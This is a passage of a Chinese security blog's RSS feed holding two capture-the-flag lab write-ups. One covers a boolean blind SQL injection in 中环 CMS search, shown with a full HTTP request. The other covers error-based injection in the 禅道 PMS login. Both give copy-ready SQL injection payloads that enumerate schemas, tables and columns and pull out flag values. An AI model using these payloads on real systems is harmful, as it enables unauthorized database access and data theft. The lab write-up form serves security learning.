-        <title>中环 CMS 主页面存在 SQL 注入</title>
-        <link>https://xxxhidexxx.github.io/posts/sec/sqli7/</link>
-        <pubDate>Mon, 19 Feb 2024 00:00:00 +0000</pubDate>
-        
-        <guid>https://xxxhidexxx.github.io/posts/sec/sqli7/</guid>
-        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/sqli7/ -&lt;h2 id=&#34;注入点&#34;&gt;注入点&lt;/h2&gt;
-&lt;p&gt;第一次见到这种注入点。我们在搜索框输入 t 然后抓包，这是为了保证返回的搜索内容不为空。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli7-4.png&#34; alt=&#34;sqli7&#34;&gt;&lt;/p&gt;
-&lt;p&gt;发现 sertype 变量在加入恒真恒伪后提供了一个布尔盲注点位。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;POST /index.php/index/search HTTP/1.1
-Host: 111.9.41.91:53009
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate, br
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 140
-Origin: http://111.9.41.91:53009
-Connection: close
-Referer: http://111.9.41.91:53009/index.php/index/search
-Cookie: admin=admin; pass=21232f297a57a5a743894a0e4a801fc3; PHPSESSID=0gficahl2rfqurrer05uhkdv96
-Upgrade-Insecure-Requests: 1
-
-sertype=1 and 1=2;#&amp;amp;search=t&amp;amp;sub=%E6%90%9C%E7%B4%A2
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli7-5.png&#34; alt=&#34;sqli7&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;爆破&#34;&gt;爆破&lt;/h2&gt;
-&lt;p&gt;开 burp 爆破。&lt;/p&gt;
-&lt;p&gt;构造如下 payload。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;1 and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=100;# 
-
-1 and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;flag_db&#39; limit 0,1),1,1))=1;#  
-
-1 and ascii(substr((select column_name from information_schema.columns where table_schema=&#39;flag_db&#39; and table_name=&#39;flag&#39; limit 0,1),1,1))=1;#  
-
-1 and ascii(substr((select value from flag_db.flag limit 0,1),1,1))=1;#  
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;其中 burp 的 payload 位置如下。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;1 and ascii(substr((select schema_name from information_schema.schemata limit $0$,1),$1$,1))=$1$;# 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;得到如下结果。&lt;/p&gt;
-&lt;p&gt;102 108 97 103 95 100 98 flag_db&lt;/p&gt;
-&lt;p&gt;102 108 97 103 flag&lt;/p&gt;
-&lt;p&gt;105 100 id 118 97 108 117 101 value&lt;/p&gt;
-&lt;p&gt;121 119 97 113 123 73 104 122 120 100 73 72 71 115 106 125 ywaq{IhzxdIHGsj}&lt;/p&gt;
-&lt;p&gt;得到 flag=ywaq{IhzxdIHGsj}。&lt;/p&gt;
-&lt;p&gt;其中 burp 结果如下图所示。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli7-1.png&#34; alt=&#34;sqli7&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli7-0.png&#34; alt=&#34;sqli7&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli7-2.png&#34; alt=&#34;sqli7&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli7-3.png&#34; alt=&#34;sqli7&#34;&gt;&lt;/p&gt;
-- https://xxxhidexxx.github.io/posts/sec/sqli7/ - null</description>
-        </item>
-    
-    
-    
-        <item>
-        <title>禅道 PMS 用户登录存在 SQL 注入</title>
-        <link>https://xxxhidexxx.github.io/posts/sec/sqli6/</link>
-        <pubDate>Mon, 19 Feb 2024 00:00:00 +0000</pubDate>
-        
-        <guid>https://xxxhidexxx.github.io/posts/sec/sqli6/</guid>
-        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/sqli6/ -&lt;h2 id=&#34;语法报错&#34;&gt;语法报错&lt;/h2&gt;
-&lt;p&gt;下述 payload 可以直接复制使用。&lt;/p&gt;
-&lt;h3 id=&#34;extractvalue&#34;&gt;extractvalue()&lt;/h3&gt;
-&lt;pre&gt;&lt;code&gt;1&#39; and extractvalue(1,concat(0x5c,0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)) and &#39;1&#39;=&#39;1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;updatexml&#34;&gt;updatexml()&lt;/h3&gt;
-&lt;pre&gt;&lt;code&gt;1&#39; and updatexml(1,concat(0x5c,0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1) and &#39;1&#39;=&#39;1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;floor&#34;&gt;floor()&lt;/h3&gt;
-&lt;pre&gt;&lt;code&gt;1&#39; and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),0x2b,floor(rand(0)*2))x from information_schema.tables group by x)a) and &#39;1&#39;=&#39;1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&#34;攻击流程&#34;&gt;攻击流程&lt;/h2&gt;
-&lt;p&gt;打开靶场看到如下页面。在输入随机用户名密码之后会出现弹窗，告诉我们密码有误。但是输入单引号之后，页面没有任何变化。没有出现弹窗说明单引号起作用了，这提示我们存在 sql 注入点。我们用 burp 抓包发现虽然浏览器里面的页面没有显示报错，但是 burp 里面可以看到语法报错。后面走走流程就可以拿到 flag。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli6-3.png&#34; alt=&#34;sqli6&#34;&gt;&lt;/p&gt;
-&lt;p&gt;构造如下 payload。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;1&#39; and extractvalue(1,concat(0x5c,0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)) and &#39;1&#39;=&#39;1
-
-1&#39; and extractvalue(1,concat(0x5c,0x7e,(select table_name from information_schema.tables where table_schema=&#39;zentao&#39; limit 0,1),0x7e)) and &#39;1&#39;=&#39;1
-
-1&#39; and extractvalue(1,concat(0x5c,0x7e,(select column_name from information_schema.columns where table_schema=&#39;zentao&#39; and table_name=&#39;flag&#39; limit 0,1),0x7e)) and &#39;1&#39;=&#39;1
-
-1&#39; and extractvalue(1,concat(0x5c,0x7e,(select flag from zentao.flag),0x7e)) and &#39;1&#39;=&#39;1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;最终拿到 flag=ywaq{sql-ywaqnb-bczr}。上述 payload 效果如下。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli6-0.png&#34; alt=&#34;sqli6&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli6-1.png&#34; alt=&#34;sqli6&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli6-2.png&#34; alt=&#34;sqli6&#34;&gt;&lt;/p&gt;
-- https://xxxhidexxx.github.io/posts/sec/sqli6/ - null</description>
         </item>
     
     
